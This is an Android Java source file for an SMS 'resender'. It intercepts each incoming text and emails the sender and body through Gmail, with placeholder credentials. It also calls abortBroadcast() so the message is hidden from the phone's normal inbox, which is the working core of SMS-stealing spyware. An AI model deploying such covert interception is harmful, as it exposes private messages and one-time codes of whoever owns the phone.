package com.gilevich.resender;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
	String lsms;
	String str = "";
	/* package */static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

	@Override
	public void onReceive(Context context, Intent intent) {
		// ---get the SMS message passed in---
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		if (bundle != null) {
			// ---retrieve the SMS message received---
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int i = 0; i < msgs.length; i++) {
				msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				str = "";
				str += "SMS от " + msgs[i].getOriginatingAddress() + ":";
				str += msgs[i].getMessageBody().toString();
				str += "\n";
				Sending snd = new Sending();
				snd.execute("");
				abortBroadcast();
			}
		}

	}

	class Sending extends AsyncTask<String, Void, String> {

		@Override
		protected String doInBackground(String... params) {
			// TODO Auto-generated method stub
			try {
				GMailSender sender = new GMailSender(
						"your_GMAIL_adress", "your_password");
				sender.sendMail("Android SMS", str, "your_e-mail",
						"addressee");
			} catch (Exception e) {
				Log.e("i1", e.toString());
			}

			return null;
		}

	}
}